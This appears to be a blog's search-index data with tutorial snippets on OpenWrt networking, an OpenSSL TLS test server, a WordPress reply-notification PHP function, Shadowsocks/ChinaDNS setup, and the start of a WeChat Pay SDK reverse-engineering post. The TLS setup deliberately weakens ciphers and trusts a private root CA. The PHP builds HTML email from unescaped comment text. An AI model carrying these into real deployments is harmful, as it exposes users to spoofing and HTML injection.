Protocol 选取 any，Source Zone 选 wan，Destination Zone 选 lan，Internal IP address 选 DMZ 主机的 IP。注意，openwrt 的端口转发规则是多条规则按从上到下优先级，先匹配到规则后不再匹配后续的规则桥接多个网卡适配器到 LAN如果你的 OpenWrt 运行在 ESXi 虚拟机下，你可能想让主机的多个网口（网卡适配器）绑定到 OpenWrt 的 LAN 接口，并且互相桥接（此时多个网口的关系相当于交换机）。配置很简单，如下vim /etc/config/network ## 仅单个网卡接入 LAN 的配置config interface &#39;lan&#39;option proto &#39;static&#39;option ipaddr &#39;192.168.1.1&#39;option netmask &#39;255.255.255.0&#39;option ip6assign &#39;60&#39;option _orig_ifname &#39;eth3&#39;option _orig_bridge &#39;false&#39;option ifname &#39;eth3&#39;## 多个网卡接入 LAN 并启用桥接的配置config interface &#39;lan&#39;option proto &#39;static&#39;option ipaddr &#39;192.168.1.1&#39;option netmask &#39;255.255.255.0&#39;option ip6assign &#39;60&#39;option _orig_ifname &#39;eth3&#39;option _orig_bridge &#39;true&#39;option type &#39;bridge&#39;option ifname &#39;eth0 eth2 eth3&#39;编辑完后执行以下命令使配置生效/etc/init.d/network reload实际效果如图所示" }, { "title": "搭建 SSL/TLS 测试服务器", "url": "/posts/setup-a-tls-test-server/", "categories": "Web", "tags": "TLS", "date": "2018-09-18 00:00:00 +0800", "snippet": "本文介绍了在 Ubuntu 18.04 环境下利用 OpenSSL 的 s_server 命令搭建 SSL/TLS 测试服务器的方法，可用于测试 Chrome 浏览器下的各种 SSL/TLS 错误。创建私有 CA 和服务器证书以 Chrome NET::ERT_CERT_WEAK_KEY 错误为例，要构造此场景，需要服务器证书的密钥长度小于 1024 bit，我的方法是先生成私有 CA， 然后签发相应密钥长度的服务器证书。注意：不推荐直接使用自签名证书，在Chrome 浏览器上会遇到各种问题；文章发布时 Chrome 最新稳定版本为 M69。创建一个私有 CA首先，生成服一个 CA 私钥 rootCA.key，命令执行过程中需要输入一个密码来保护私钥mkdir selfCAcd selfCAopenssl genrsa -des3 -out rootCA.key 2048生成 CA 证书 rootCA.crtopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 1024 -out rootCA.crt注意：命令执行过程中需要按要求录入多个证书信息字段，包括 Country Name, Organization Name, Common Name 等等，这些信息是用于标识创建的 CA，而非你的域名。签发服务器证书创建 SSL 服务器私钥 selfsigned.key 以其证书签名请求文件 server.csr，后者用于向创建的 CA 请求证书openssl req -new -sha256 -nodes -out server.csr -newkey rsa:2048 -keyout selfsigned.key注意：最重要的字段是 Common Name (e.g. server FQDN or YOUR name), 你可以使用 localhost ，IP 地址或实际的域名，例如 xxx.example.com；challenge 留空。创建一个 v3.ext 文件，这里用于给服务器证书添加“使用者可选名称”扩展字段，以解决 Chrome 下“Certificate - Subject Alternative Name Missing”SSL/TLS 错误。内容如下authorityKeyIdentifier=keyid,issuerbasicConstraints=CA:FALSEkeyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEnciphermentsubjectAltName = @alt_names}[alt_names]DNS.1 = xxx.example.com最后使用之前创建的 CA 签发服务器证书 selfsigned.crtopenssl x509 -req -in server.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial -out selfsigned.crt -days 1000 -sha256 -extfile v3.ext注意：整个过程中我们为 CA 和服务器分别创建了密码学材料，从密码学上看二者本质上没有区别 — 它们对应的都是私钥、公钥和证书，只是前者用来签发证书，后者用来作 SSL/TLS 服务器凭证，仅仅用途不同而已。运行 SSL/TLS 测试服务有了服务器证书和私钥，就可以运行 Web 服务器了。OpenSSL 的 s_server 命令已经实现了一个基本的 SSL/TLS 服务，可监听并接受指定端口的 SSL/TLS 连接，我们直接使用此命令启动 Web 服务器。使用先前生成的服务器证书和私钥启动 s_serveropenssl s_server -cert selfsigned.crt -key selfsigned.key -cipher &quot;ALL:@SECLEVEL=0&quot; -www -accept 4433其中 -accept 4433 指定监听 4433 端口; -www 表示向连接的客户端返回 SSL/TLS 握手信息，以 HTML 格式（如果需要响应指定 HTML 文件，使用 -WWW，然后以 http://yourdomain/page.html 形式访问文件）到此，你已经可以使用 Chrome 访问测试服务了，但是会出现证书不被系统信任的 SSL 错误，我们还需要将创建的 CA 添加到系统信任证书颁发机构。将 CA 证书添加至操作系统信任列表Windows双击 rootCA.crt，选择安装证书，导入到「受信任的根证书颁发机构」。Android系统设置 里选择“安装证书”或直接点击 rootCA.crt 进行安装，安装时选择「VPN 和应用」。" }, { "title": "WP Mail SMTP troubleshooting", "url": "/posts/wp-mail-smtp-troubleshooting/", "categories": "Tutorial", "tags": "WordPress", "date": "2018-08-22 00:00:00 +0800", "snippet": "IntroductionMy WordPress blog use WP Mail SMTP by WPForms as SMTP mail plugin, and this article records some of my troubleshooting of integration.Mail Sender’s Name is always not setIf you use Gmail as SMTP provider, the mail’s Sender Name may always appear your gmail mail address even though you had the From Name option in the plugin or the Name option in Gmail settings correctly set. This occurs when the From Email of WP Mail SMTP plugin option was not same as your Gmail account. Change it to your Gmail address will fix the issue.Comment’s rely has notification mail to the authorWordPress doesn’t automatically send out email to notify the author of the comment when some one reply. You can add following code snippets to functions.php of your theme to solve it.Note:  Your WP Mail SMTP plugin should work correctly first.function comment_mail_notify($comment_id) {    $comment = get_comment($comment_id);    $parent_id = $comment-&amp;gt;comment_parent ? $comment-&amp;gt;comment_parent : &#39;&#39;;    $spam_confirmed = $comment-&amp;gt;comment_approved;    if (($parent_id != &#39;&#39;) &amp;amp;&amp;amp; ($spam_confirmed != &#39;spam&#39;)) {        $wp_email = &#39;no-reply@&#39; . preg_replace(&#39;#^www.#&#39;, &#39;&#39;, strtolower($_SERVER[&#39;SERVER_NAME&#39;]));        $to = trim(get_comment($parent_id)-&amp;gt;comment_author_email);        $subject = &#39;[通知]您的留言有了新的回复&#39;;        $message = &#39;            &amp;lt;div style=&quot;background:#ececec;width: 100%;padding: 50px 0;text-align:center;&quot;&amp;gt;            &amp;lt;div style=&quot;background:#fff;width:750px;text-align:left;position:relative;margin:0 auto;font-size:14px;line-height:1.5;&quot;&amp;gt;                    &amp;lt;div style=&quot;zoom:1;padding:25px 40px;background:#518bcb; border-bottom:1px solid #467ec3;&quot;&amp;gt;                        &amp;lt;h1 style=&quot;color:#fff; font-size:25px;line-height:30px; margin:0;&quot;&amp;gt;&amp;lt;a href=&quot;&#39; . get_option(&#39;home&#39;) . &#39;&quot; style=&quot;text-decoration: none;color: #FFF;&quot;&amp;gt;&#39; . htmlspecialchars_decode(get_option(&#39;blogname&#39;), ENT_QUOTES) . &#39;&amp;lt;/a&amp;gt;&amp;lt;/h1&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;div style=&quot;padding:35px 40px 30px;&quot;&amp;gt;                    &amp;lt;h2 style=&quot;font-size:18px;margin:5px 0;&quot;&amp;gt;Hi &#39; . trim(get_comment($parent_id)-&amp;gt;comment_author) . &#39;:&amp;lt;/h2&amp;gt;                    &amp;lt;p style=&quot;color:#313131;line-height:20px;font-size:15px;margin:20px 0;&quot;&amp;gt;您有一条留言有了新的回复，摘要信息请见下表。&amp;lt;/p&amp;gt;                        &amp;lt;table cellspacing=&quot;0&quot; style=&quot;font-size:14px;text-align:center;border:1px solid #ccc;table-layout:fixed;width:500px;&quot;&amp;gt;                            &amp;lt;thead&amp;gt;                                &amp;lt;tr&amp;gt;                                    &amp;lt;th style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:normal;color:#a0a0a0;background:#eee;border-color:#dfdfdf;&quot; width=&quot;235px;&quot;&amp;gt;原文&amp;lt;/th&amp;gt;                                    &amp;lt;th style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:normal;color:#a0a0a0;background:#eee;border-color:#dfdfdf;&quot; width=&quot;235px;&quot;&amp;gt;回复&amp;lt;/th&amp;gt;                                    &amp;lt;th style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:normal;color:#a0a0a0;background:#eee;border-color:#dfdfdf;&quot; width=&quot;100px;&quot;&amp;gt;作者&amp;lt;/th&amp;gt;                                    &amp;lt;th style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:normal;color:#a0a0a0;background:#eee;border-color:#dfdfdf;&quot; width=&quot;90px;&quot; &amp;gt;操作&amp;lt;/th&amp;gt;                                &amp;lt;/tr&amp;gt;                            &amp;lt;/thead&amp;gt;                            &amp;lt;tbody&amp;gt;                                &amp;lt;tr&amp;gt;                                    &amp;lt;td style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;&quot;&amp;gt;&#39; . trim(get_comment($parent_id)-&amp;gt;comment_content) . &#39;&amp;lt;/td&amp;gt;                                    &amp;lt;td style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;&quot;&amp;gt;&#39;. trim($comment-&amp;gt;comment_content) . &#39;&amp;lt;/td&amp;gt;                                    &amp;lt;td style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;&quot;&amp;gt;&#39; . trim($comment-&amp;gt;comment_author) . &#39;&amp;lt;/td&amp;gt;                                    &amp;lt;td style=&quot;padding:5px 0;text-indent:8px;border:1px solid #eee;border-width:0 1px 1px 0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;&quot;&amp;gt;&amp;lt;a href=&quot;&#39;.get_comment_link( $comment-&amp;gt;comment_ID ).&#39;&quot; style=&quot;color:#1E5494;text-decoration:none;vertical-align:middle;&quot; target=&quot;_blank&quot;&amp;gt;查看回复&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;                                &amp;lt;/tr&amp;gt;                            &amp;lt;/tbody&amp;gt;                        &amp;lt;/table&amp;gt;                        &amp;lt;br&amp;gt;                     &amp;lt;div style=&quot;font-size:13px;color:#a0a0a0;padding-top:10px&quot;&amp;gt;该邮件由系统自动发出，如果不是您本人操作，请忽略此邮件。&amp;lt;/div&amp;gt;                    &amp;lt;div class=&quot;qmSysSign&quot; style=&quot;padding-top:20px;font-size:12px;color:#a0a0a0;&quot;&amp;gt;                        &amp;lt;p style=&quot;color:#a0a0a0;line-height:18px;font-size:12px;margin:5px 0;&quot;&amp;gt;&#39; . htmlspecialchars_decode(get_option(&#39;blogname&#39;), ENT_QUOTES) . &#39;&amp;lt;/p&amp;gt;                        &amp;lt;p style=&quot;color:#a0a0a0;line-height:18px;font-size:12px;margin:5px 0;&quot;&amp;gt;&amp;lt;span style=&quot;border-bottom:1px dashed #ccc;&quot; t=&quot;5&quot; times=&quot;&quot;&amp;gt;&#39; . date(&quot;Y年m月d日&quot;,time()) . &#39;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;                    &amp;lt;/div&amp;gt;                &amp;lt;/div&amp;gt;            &amp;lt;/div&amp;gt;        &amp;lt;/div&amp;gt;&#39;;        $headers = &quot;Content-Type: text/html; charset=&quot; . get_option(&#39;blog_charset&#39;) . &quot;n&quot;;        wp_mail( $to, $subject, $message,$headers);    }}add_action(&#39;comment_post&#39;, &#39;comment_mail_notify&#39;);Reference : oldpan.meThe reference’s  original code has a bug which causes mail’s From Name not set when using Gmail as SMTP provider, I fix it by remove from tag in headers." }, { "title": "OpenWrt Shadowsocks 安装&amp;配置指南", "url": "/posts/shadowsocks-on-openwrt/", "categories": "Tutorial, Shadowsocks", "tags": "OpenWrt, Shadowsocks", "date": "2018-07-21 00:00:00 +0800", "snippet": "前言这是一篇 OpenWrt 19（19.07.4 版本验证）下安装 Shadowsocks 的教程。由于 OpenWrt 从 22.03.0 开始，使用 nftables 代替了 iptables 来配置 Linux 的网络过滤规则，而本文中部分软件截止文章更新时仍未对此做兼容，因此下文所述方案已经无法在最新版本的 OpenWrt 正常工作，因此如果你是新版本的 OpenWrt，请绕行或关注 luci-app-shadowsocks 是否更新了新的版本。同时，如果你只使用机场，大部分机场使用 Clash 就可以很好地工作，因此博主强烈建议在 OpenWrt 下使用 ShellCrash，详细安装配置过程参考这篇文章。简介文章先介绍了整体软件栈和通信原理，然后详细说明了各个软件的安装、配置过程，最终可搭建一个路由规则是国内 IP 直连、其余 IP 走透明代理的翻墙路由器（即 CHNRoutes 黑名单模式）。要使用 GFWList 路由模式（即仅被 GFW 封锁的流量走代理），请参阅本站另外一篇文章：《OpenWrt Shadowsocks GFWlist 配置教程》。提示：推荐使用 CHNRoutes 路由规则，效果稳定且能够避免部分 GFWList 遗漏的网站无法访问，对于外网访问也有一定的加速效果（Shadowsocks 服务端网络连接性能优良的前提下）。软件逻辑架构Shadowsocks for OpenWrt 是基于 shadowsocks-libev 移植的，包含 ss-local、ss-redir 和 ss-tunnel 三个组件。此外，一个完整的 Shadowsocks 透明代理解决方案还包括 ChinaDNS 和远程 Shadowsocks 服务器等配套服务，整体逻辑架构图如下其中，ss-redir 负责将 OpenWrt 的 TCP/UDP 出口流量透明地转发至境外 shadowsocks 代理服务器；ss-local 是本地 SOCKS5 代理服务器，可额外地为浏览器等客户端应用提供 SOCKS5 代理服务；Dnsmaq 是 OpenWrt 的默认 DNS 转发服务，本方案中负责接收来自局域网的 DNS 请求后转发给 ChinaDNS 处理；ChinaDNS 是一个开源的防 DNS 污染解决方案，它通过 ss-tunnel 转发 DNS 请求到墙外服务器，从而获取无污染的解析结果。Step 1 - 安装&amp;amp;配置 Shadowsocks安装 Shadowsocks先安装 shadowsocks-libev  UDP-Relay 功能的依赖包 iptables-mod-tproxyopkg updateopkg install iptables-mod-tproxy 由于 OpenWrt 内建的 wget 不支持 TLS，无法下载 HTTPS 网站上的软件包，因此还要安装好整版的 wget 和 CA 证书软件，前者负责下载链接，后者提供 HTTPS 连接所需的根证书：opkg install wget ca-certificates最后，正式开始安装 shadowsocks-libev 以及 luci-app-shadowsocks。可使用离线下载预编译包和软件源两种安装方式，读者可根据本地环境不同选择。 使用作者的软件源安装 Shadowsocks（推荐方法）添加软件源公钥wget http://openwrt-dist.sourceforge.net/packages/openwrt-dist.pubopkg-key add openwrt-dist.pub添加软件源到配置文件，注意务必将 x86_64 替换为你自己硬件的 CPU 架构名，可用 opkg print-architecture 命令查询。vim /etc/opkg/customfeeds.confsrc/gz openwrt_dist http://openwrt-dist.sourceforge.net/packages/base/x86_64src/gz openwrt_dist_luci http://openwrt-dist.sourceforge.net/packages/luci安装 shadowsocks-libev、luci-app-shadowsocksopkg updateopkg install shadowsocks-libevopkg install luci-app-shadowsocks 使用 OpenWrt 自带软件源安装 Shadowsocks（不推荐）最新的 OpenWrt （例如 19.07） 已经已经自带 Shadowsocks 软件包，可参照 https://openwrt.org/docs/guide-user/services/proxy/shadowsocks 的说明来安装，但是自带软件源的 Shadowsocks 版本太低，不太推荐。安装如下软件包opkg install shadowsocks-libev-ss-local shadowsocks-libev-ss-redir shadowsocks-libev-ss-rules shadowsocks-libev-ss-tunnel如果需要 Luci Web 界面还要安装opkg install luci-app-shadowsocks-libev 手动下载预编译包安装 Shadowsocks（备用方法）前往作者 github 主页获取最新的预编译版本 shadowsocks-libev 和 luci-app-shadowsocks UI 界面。注意，选择 current 目录下匹配你硬件架构的版本。使用以下命令查询你的路由器硬件架构，例如博主是 x86_64。opkg print-architecture获取链接后，下载并安装上述软件包cd /tmpwget https://xxx.ipkopkg install xxx.ipk配置 Shadowsocks Servers Manage 管理 Shadowsocks 服务器节点。按照实际情况填写你的 Shadowsocks 代理服务器信息即可。 注意：如果要开启 TCP Fast Open 选项，需要修改 sysctl.conf 添加一行net.ipv4.tcp_fastopen = 3，然后使之生效。命令如下 echo &quot;net.ipv4.tcp_fastopen = 3&quot; &amp;gt;&amp;gt; /etc/sysctl.conf sysctl -p General Settings 使能 Transparent Proxy 和 Port Forward，其中 UDP-Relay 是 UDP 转发功能，这里要将其开启，其余配置项保持默认即可。 Access Control Bypassed IP List 选择 ChinaDNS CHNRoute（ChinaDNS 安装后，IP 路由文件的路径，例如 /etc/chinadns-ng/chinalist.txt）或自定义 CHNRoute 文件地址（参考安装 ChinaDNS 中关于 /etc/chinadns_chnroute.txt 的描述） Shadowsocks 的访问规则控制。CHNRoute 是一种合适规则是国外网站走 Shadowsocks 代理而国内网站直连，这样通常还可以加速国外网站，相应的，也可以选择 GFWRoute。Step 2 安装&amp;amp;配置 ChinaDNS国内运营商网络 DNS 污染严重，导致大量境外域名无法正确解析，而 shadowsocks-libev 本身并没有解决 DNS 污染问题，需要配合 ChinaDNS 组件来解决。另外，也可以采用重构优化的 ChinaDNS-NG 来替代。二者主要区别： ChinaDNS 安装简单、使用稳定可靠，但最近一次更新是 2015 年； ChinaDNS-NG 是新近的项目，需要自行编译，稳定性还需要验证； ChinaDNS 无法显式定义可信 DNS 和 国内 DNS，而是根据 IP 地址自动判断； ChinaDNS 也无法显式定义具体域名的解析行为，譬如指定域名使用可信 DNS（或国内 DNS）解析。读者可自行决定选择哪一个方案。方案一 - 采用 ChinaDNS安装 ChinaDNSChinaDNS 解决 DNS 污染的思路如下： ChinaDNS 分国内 DNS 和可信 DNS。ChinaDNS 会同时向国内 DNS 和可信 DNS 发请求，如果可信 DNS 先返回，则采用可信 DNS 的数据；如果国内 DNS 先返回，又分两种情况，返回的数据是国内的 IP 则采用，否则丢弃并转而采用可信 DNS 的结果。安装方法同样有两种： 用软件源安装 如果先前安装 shadowsocks-libev 时已添加了 openwrt-dist 源 ，可直接命令行安装 ChinaDNS opkg install ChinaDNS opkg install luci-app-chinadns 下载预编译版本安装 前往项目主页获取最新的预编译版本 ChinaDNS （选择 current 目录下特定硬件平台版本） 和 chinadns-luci-app 并安装： cd /tmp wget https://xxx.ipk opkg install xxx.ipk 安装完成后立即更新 ChinaDNS 的国内 IP 路由表 /etc/chinadns_chnroute.txt，这里分别提供 apnic 和国内的 ipip.net 整理的路由表更新命令，推荐注重性能的使用后者： apnic wget -O /tmp/delegated-apnic-latest &#39;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&#39; &amp;amp;&amp;amp; awk -F\\| &#39;/CN\\|ipv4/ { printf(&quot;%s/%d\\n&quot;, $4, 32-log($5)/log(2)) }&#39; /tmp/delegated-apnic-latest &amp;gt; /etc/chinadns_chnroute.txt ipip.net wget https://raw.githubusercontent.com/17mon/china_ip_list/master/china_ip_list.txt -O /tmp/china_ip_list.txt &amp;amp;&amp;amp; mv /tmp/china_ip_list.txt /etc/chinadns_chnroute.txt 使用 crontab -e 命令编辑 cron 任务计划，每月（1 号凌晨 3 点）更新 chinadns_chnroute.txt，编辑内容如下（apnic 和 ipip.net 择一）：#For apnic0 3 1 * *    wget http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest -O /tmp/delegated-apnic-latest &amp;amp;&amp;amp; awk -F\\| &#39;/CN\\|ipv4/ { printf(&quot;%s/%d\\n&quot;, $4, 32-log($5)/log(2)) }&#39; /tmp/delegated-apnic-latest &amp;gt; /etc/chinadns_chnroute.txt#For ipip.net0 3 1 * *    wget https://raw.githubusercontent.com/17mon/china_ip_list/master/china_ip_list.txt -O /tmp/china_ip_list.txt &amp;amp;&amp;amp; mv /tmp/china_ip_list.txt /etc/chinadns_chnroute.txt编辑完成后启用 cron 程序：/etc/init.d/cron start/etc/init.d/cron enable验证 crontab 任务是否正确执行：logread | grep crond注意：不要直接使用 vim 编辑 /etc/crontabs/root 文件；本文提供的更新命令已经过优化，网络连接失败的情况下不会覆写错误信息到 /etc/chinadns_chnroute.txt 避免造成异常。安装好后如图所示（忽略 vlmcsd ）：配置 ChinaDNS勾选 Also filter results inside China from foreign DNS servers、将上游 DNS 修改为114.114.114.114,127.0.0.1:5300其中国内 IP DNS 用于解析国内域名，建议使用运营商提供的DNS地址（注：因为有时114DNS速度慢于远程DNS，特别是远程DNS转发性能特别好时，而运营商DNS则一般不会发生这种情况。通过查看 /etc/resolv.conf 得到本地运营商DNS）；127.0.0.1:5300 为 ss-tunnel 提供的 DNS 端口转发服务，负责DNS的远程服务器解析。最后，启动 ChinaDNS。如图所示这里结合代码深入讲解一下 ChinaDNS 的上游 DNS（-s 参数）工作模型： int dns_is_chn = 0; int dns_is_foreign = 0; if (chnroute_file &amp;amp;&amp;amp; (dns_servers_len &amp;gt; 1)) { dns_is_chn = test_ip_in_list(dns_addr, &amp;amp;chnroute_list); dns_is_foreign = !dns_is_chn; }当配置了多个上游 DNS 时，ChinaDNS 简单通过判断 DNS 的 IP 地址是否在国内来定义为「国内 DNS」， 否则一律为「国外 DNS」，这个隐式逻辑虽然简单易用但会在复杂配置场景带来问题，典型的：当「国内 DNS」是用 Stubby 搭建的本地代理 DNS 时，会将 Stubby 误判成「国外 DNS」，导致非预期的行为。方案二 - 采用 ChinaDNS-NGChinaDNS-NG 项目 目前并没有提供预编译包，需要使用 openwrt sdk 来手动编译，比较麻烦，可以使用下面的预编译包来安装。使用 ChinaDNS-NG 预编译包安装可以在 (op.supes.top)[https://op.supes.top/packages/mips_24kc/] 下载安装 ChinaDNS-NG 预编译包，包括一个可执行文件包和一个 luci 包。编译 ChinaDNS-NG 安装出于方便本文使用 docker 来创造 openwrt 编译环境。首先，进入 docker hub 找到匹配你的 openwrt 软硬件（可用 opkg print-architecture 查到硬件架构）的 SDK 镜像，然后使用 docker pull 命令拉取，例如：docker pull openwrtorg/sdk:mips_24kc-19.07.4接着启动容器：docker run --rm -v &quot;$(pwd)&quot;/bin/:/home/build/openwrt/bin -it openwrtorg/sdk:mips_24kc-19.07.4在容器内执行以下命令来编译 ChinaDNS-NG：#获取源码git clone https://github.com/pexcn/openwrt-chinadns-ng.git package/chinadns-ng#选中 Network -&amp;gt; chinadns-ng （由空变成 M：单独打包，不编入系统镜像，或 *：打包并编入镜像）make menuconfig#编译 chinadns-ngmake package/chinadns-ng/{clean,compile} V=s在容器内执行以下命令来编译 ChinaDNS-NG LuCI APP#获取源码git clone -b luci https://github.com/pexcn/openwrt-chinadns-ng.git package/luci-app-chinadns-ng#安装 luci 依赖，否则 meke menuconfig 无 LuCI 子项可选./scripts/feeds update -a./scripts/feeds install luci#选中 LuCI -&amp;gt; Applications -&amp;gt; luci-app-chinadns-ng（由空变成 M 或 *）make menuconfig#编译 luci-app-chinadns-ngmake package/luci-app-chinadns-ng/{clean,compile} V=s最后在主机的 &quot;$(pwd)&quot;/bin 目录，就能找到编译结果了。将将编译出来的 ChinaDNS-NG 和 ChinaDNS-NG LuCI APP 的 ipk 包安装到 openwrt，这里有个坑，由于 ChinaDNS-NG LuCI APP 安装时会再次释放 ChinaDNS-NG 配置文件到系统，若提示文件冲突导致安装失败，可以手动删除冲突的配置文件后再次安装。配置 ChinaDNS-NG安装完毕，进入 ChinaDNS-NG 的 Web 界面，修改 Trusted DNS Servers 为 127.0.0.1#5300 ，按你的喜好修改 China DNS Servers（这里如果希望使用 DNS over TLS 的，可参考博主的另外一篇文章），最后启动 ChinaDNS-NG 即可。ChinaDNS-NG 高级配置： Enable the Fair_Mode：当可信 DNS 可能先于国内 DNS 返回时建议开启。当可信 DNS 先于国内 DNS 返回时（极少数情况如此），原版 ChinaDNS 是直接采用可信 DNS 的结果，导致国内域名的解析被可信 DNS 抢答，如果该国内域名又正好有境外服务器，解析结果就非最优线路。该选项就是解决这一问题：当可信 DNS 先返回时，ChinaDNS-NG 并不立即采用，而是等待国内 DNS 的结果，随后如果国内 DNS 返回国内 IP，则采用，否则采用可信 DNS 的结果。这个选项大部分情况会按预期运行，但不排除极特殊情形下会有异常。 Black List 和 White List：分别对应「强制走可信 DNS 的域名列表」 和「强制走国内 DNS 的域名列表」。Step 3 - 配置 DnsmasqOpenWrt 管理面 Network -&amp;gt; DHCP and DNSDNS forwardings 修改为 127.0.0.1#5353 即 ChinaDNS 监听的端口；勾选 Ignore resolve file提示：Ignore resolve file 指的是忽略 /etc/resolv.conf 中的 DNS ，即 WAN 口的 DNS，默认是电信运营商分配的 DNS；要恢复默认选项（取消勾选），在 Resolve file 一栏填入 /tmp/resolv.conf.auto 或者 /tmp/resolv.conf.d/resolv.conf.auto （新版 OpenWrt）Step 4（可选） - 让路由器自身也翻墙到此步骤为止，之前的配置已足以让接入局域网的设备正常翻墙，但为了让路由器自身发起的连接也能够翻墙成功，需要将 WAN 口默认使用的运营商 DNS 修改为 ChinaDNS如图所示，在 Network - Interfaces - WAN、WWAN（无线接入时） - Advanced Settings 中去掉 Use DNS servers advertised by peer ，并在配置栏中填入 127.0.0.1至此，一切准备就绪，Enjoy yourself! :)常见问题处理 Shadowsocks 无法启动重启路由器。如果仍未解决，使用 logread 命令查看异常日志 Luci 界面无法打开点击安装好 Shadowsocks 或 ChinaDNS 的 Luci APP 报错/usr/lib/lua/luci/dispatcher.lua:1334: module &#39;luci.cbi&#39; not found: no field package.preload[&#39;luci.cbi&#39;] no file &#39;./luci/cbi.lua&#39; no file &#39;/usr/share/lua/luci/cbi.lua&#39; no file &#39;/usr/share/lua/luci/cbi/init.lua&#39; no file &#39;/usr/lib/lua/luci/cbi.lua&#39; no file &#39;/usr/lib/lua/luci/cbi/init.lua&#39; no file &#39;./luci/cbi.so&#39; no file &#39;/usr/lib/lua/luci/cbi.so&#39; no file &#39;/usr/lib/lua/loadall.so&#39; no file &#39;./luci.so&#39; no file &#39;/usr/lib/lua/luci.so&#39; no file &#39;/usr/lib/lua/loadall.so&#39;stack traceback: [C]: in function &#39;require&#39; /usr/lib/lua/luci/dispatcher.lua:1334: in function &#39;_cbi&#39; /usr/lib/lua/luci/dispatcher.lua:1023: in function &#39;dispatch&#39; /usr/lib/lua/luci/dispatcher.lua:999: in function &#39;dispatch&#39; /usr/lib/lua/luci/dispatcher.lua:478: in function &amp;lt;/usr/lib/lua/luci/dispatcher.lua:477&amp;gt;OpenWrt 19.07 或更新版本会报此错误，原因是缺少 luci-compat 包，使用如下命令安装即可opkg install luci-compat 路由器无法连接 raw.githubusercontent.comopenwrt 下载 china_ip_list.txt 时出现如下错误wget https://raw.githubusercontent.com/17mon/china_ip_list/master/china_ip_list.txt -O /tmp/china_ip_list.txt &amp;amp;&amp;amp; mv /tmp/china_ip_list.txt /etc/chinadns_chnroute.txt--2021-05-16 19:50:02-- https://raw.githubusercontent.com/17mon/china_ip_list/master/china_ip_list.txtResolving raw.githubusercontent.com... 0.0.0.0, ::Connecting to raw.githubusercontent.com|0.0.0.0|:443... failed: Connection refused.Connecting to raw.githubusercontent.com|::|:443... failed: Connection refused.明显 raw.githubusercontent.com 的 IP 地址被错误地解析到了 0.0.0.0，说明被 GFW DNS 污染了。执行 nslookup 进行验证：root@OpenWrt:~# nslookup raw.githubusercontent.comServer: 192.168.3.1Address: 192.168.3.1#53Name: raw.githubusercontent.comAddress 1: 0.0.0.0Address 2: ::发现 openwrt 使用的 DNS 是上游分配的 DNS，按 Step 4 - 让路由器自身也翻墙处理即可。iptables v1.8.7 (legacy): unknown option “–to-ports如果 shadowsocks 一直无法启动，使用 /etc/init.d/shadowsocks start 报如上错误，是因为 OpenWrt 22 开始改用 nftables 来替代 iptables，所以要额外安装：opkg install iptables-legacy iptables-mod-nat-extra ipset iptables-nft" }, { "title": "微信支付 Android SDK 逆向", "url": "/posts/wechat-android-sdk-reverse-engineering/", "categories": "Android", "tags": "微信支付, Reverse Engineering", "date": "2018-06-18 00:00:00 +0800", "snippet": "简介按照微信官方开发者网站的描述，微信支付按模式不同有刷卡支付、公众号支付、扫码支付、APP 支付、H5 支付、小程序支付六种。其中，「APP 支付」即商户 APP 调用微信提供的 SDK 调用微信支付模块，商户 APP 会跳转到微信中完成支付，支付完后跳回到商户 APP 内，最后展示支付结果。本文将介绍 Android 平台上的 APP 支付流程，然后通过逆向工程探究微信在手机端是如何对接口进行认证的。支付流程如图所示是微信「APP 支付」时序图整个过程可归纳为以下几部分： 商户 APP 与后台（商户服务器、微信服务器）通信，生成订单信息。这里关键接口是微信服务器提供的「统一下单 API」，请求参数包含订单请求参数的签名（sign），用于完整性校验 商户 APP 与微信通信，使用前述订单发起支付请求。此时，出现微信的支付 activity，等待用户授权（指纹、密码） 用户确认支付，微信与微信服务器通信，完成最终支付 微信调用回调通知商户 APP 支付结果接口认证过程初探支付 SDK出于安全考量，微信在 Android 侧对「APP支付」做了接口认证，只有符合要求的 APP 才能使用微信的支付接口，在实际项目开发中就发现如果使用非微信平台注册的 APK 调用微信 APP 支付接口会导致失败。下面通过查看微信官方文档、反编译等手段，还原一下整个过程。首先，根据微信开发者文档描述，商户 APP 要调用微信「APP支付」接口需集成微信官方提供的 SDK。发起一次支付请求的代码如下IWXAPI api;PayReq request = new PayReq();request.appId = &quot;wxd930ea5d5a258f4f&quot;;request.partnerId = &quot;1900000109&quot;;request.prepayId= &quot;1101000000140415649af9fc314aa427&quot;,;request.packageValue = &quot;Sign=WXPay&quot;;request.nonceStr= &quot;1101000000140429eb40476f8896f4c9&quot;;request.timeStamp= &quot;1398746574&quot;;request.sign= &quot;7FFECB600D7157C5AA49810D2D8F28BC2811827B&quot;;api.sendReq(request);从中可以观察到，商户 APP 需要构造一个 PayReq 支付请求对象，用于承载商户微信在平台的注册 ID（appId）、服务器端生成的订单号（prepayId）、订单请求的签名（sign）等信息，然后通过 sendReq() 方法向微信发起该支付请求。sendReq() 在微信支付 SDK 里实现，反编译查看 sendReq() 方法WXApiImplV10.classpublic final boolean sendReq(BaseReq paramBaseReq){ if (this.detached) { 